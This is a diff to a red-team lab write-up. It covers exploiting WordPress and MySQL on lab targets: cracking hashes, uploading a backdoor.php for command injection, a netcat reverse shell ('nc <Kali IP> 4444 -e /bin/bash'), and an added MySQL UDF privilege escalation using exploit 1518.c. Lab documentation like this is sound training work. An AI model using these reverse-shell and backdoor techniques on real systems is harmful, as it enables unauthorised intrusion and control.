@@ -110,7 +110,7 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
 
   - `flag2.txt`: fc3fd58dcdad9ab23faca6e9a36e581c
     - **Exploit Used**
-      - flag 2 was in the system, directory `/var/www/`
+      - flag 2 was in the system, directory `/var/www/` <br>
       ![FLAG2](Images/Offensive/flag2.png)
 
   - `flag3.txt`: afc01ab56b50591e7dccf93122770cd2
@@ -133,7 +133,7 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
       ![mysql_usr](Images/Offensive/mysql_usr.png)
       - With these hashes, created a file called `wp_hashes.txt` with Steven & Michael's hashes:
       ![wp_hashes](Images/Offensive/wp_hashes.png)
-      - Then, cracked password hashes with `John the Rippe`r.
+      - Then, cracked password hashes with `John the Ripper`.
       ![john_wp_hashes](Images/Offensive/john_wp_hashes.png)
       - with the cracked password for Steven, SSH into Steven's user shell
       ![SSH_Steven](Images/Offensive/stevenssh.png)
@@ -171,7 +171,7 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
       - You can use any of the exploit, but for the purpose of this project, given `exploit.sh` file is used to exploit this vulnerability.
       (Also made sure that the top of the `exploit.sh` script was set TARGET variable with the IP address of Target 2)
         - [exploit.sh](Resources/exploit.sh)
-      - Then, this script was ran to upload backdoor.php file to the target server, which can be used to execute command injection attacks
+      - Then, this script was ran to upload backdoor.php file to the target server, which can be used to execute command injection attacks <br>
       ![exploit.sh_file](Images/Offensive/exploit.sh.png)
       - Nagivated to `http://<Target 2 URL>/backdoor.php?cmd=<CMD>` which allowed to run bash commands on Target 2.
         - For example, /etc/passwd
@@ -179,10 +179,10 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
       - Next, used this exploit to open backdoor reverse shell on the target. So on Kali VM, netcat listner was started:
       
         ![netcat](Images/Offensive/netcat.png)
-      - In the browser, command `nc<Kali IP> 4444 -e /bin/bash` was used to connect the reverse shell
+      - In the browser, command `nc <Kali IP> 4444 -e /bin/bash` was used to connect the reverse shell
       ![netcat2](Images/Offensive/netcat2.png)
       ![netcat3](Images/Offensive/netcat3.png)
-      - using the shell opened, flag 2 was located.
+      - using the shell opened, flag 2 was located. <br>
       ![FLAG2_2](Images/Offensive/flag2_2.png)
 
 
@@ -193,9 +193,39 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
       ![uploads_directory](Images/Offensive/uploads.png)
       ![FLAG3_2](Images/Offensive/flag3_2.png)
 
-  - `flag4.txt`: UNABLE TO LOCATE - PROCESSING- September 11, 2021
+  - `flag4.txt`: df2bc5e951d91581467bb9a2a8ff4425
     - **Exploit Used**
-      - Trying my best to see if I can complete the privilege escalation exploit successfully before the lab time is up...
+      - Went to check on the Wordpress Configuration file to check on the username and password
+      ![wp_config_2](Images/Offensive/wp-config_2.png)
+      - Tried to log into mysql using the credentials, and found the version of the MySQL.: 5.5.60
+      ![mysql_vr](Images/Offensive/mysql_vr.png)
+      - with this version of mysql, privilege Escalation exploit can be used to climb the ladder within the system. 
+      - In order to find the right exploit, searchsploit was used:
+      ![searchsploit_udf](Images/Offensive/searchsploit_udf.png)
+      - Decided to use `1518.c` exploit
+      - Looked through the exploit file itself to see if there was any written instruction as to how to use this exploit
+      ![searchsploit_x](Images/Offensive/searchsploit_x.png)
+      ![1518.c](Images/Offensive/1518-c.png)
+      - Written instruction was clear. Once the confirmation to use this exploit was set, exploit was copied from the searchsploit library to the Kali desktop. Then, exploit file was modified to this specific usage:
+      ![searchsploit_m](Images/Offensive/searchsploit_m.png)
+      - Now, we have to move this exploit file to the target victim's computer.
+      - To do so, I've started apache2 service from Kali:<br>
+      ![apache2service](Images/Offensive/apache2service.png)
+      ![move_to_html](Images/Offensive/move_to_html.png)
+      - Then, I've used wget command to transfer over the exploit file
+      ![wget1](Images/Offensive/wget1.png)
+      ![wget2](Images/Offensive/wget2.png)
+      - Then, moved the exploit file to the tmp folder:<br>
+      ![tmp](Images/Offensive/tmp.png)
+      - Now that it was ready to exploit, login to MySQL using the credentials from the configuration file, and went on with the commandline instructions found on the exploit file:
+      ![mysql1](Images/Offensive/mysql1.png)
+      ![mysql2](Images/Offensive/mysql2.png)
+      ![mysql3](Images/Offensive/mysql3.png)
+      ![mysql4](Images/Offensive/mysql4.png)
+      ![mysql5](Images/Offensive/mysql5.png)
+      
+
+
 
 
 <br>
@@ -211,6 +241,8 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
 - National Vulnerability Database (Aug, 2013) CVE-2013-0235 Detail Retrieved from https://nvd.nist.gov/vuln/detail/CVE-2013-0235
 - cve.mitre.org (Sept, 2021) CVE-2016-10033 Retrieved from https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-10033
 - javiercasares (Feb, 2019) WP-Cron detection? Retrieved from https://github.com/wpscanteam/wpscan/issues/1299
+- Exploit Database (Sept, 2021) MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2) Retreived from https://www.exploit-db.com/exploits/1518
+
 
 
 
